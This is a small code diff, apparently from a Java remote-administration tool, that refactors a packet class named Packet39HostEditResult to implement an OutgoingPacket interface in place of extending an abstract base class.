@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet39HostEditResult extends AbstractOutgoingPacket {
+public class Packet39HostEditResult implements OutgoingPacket {
 
 	private String status;
 
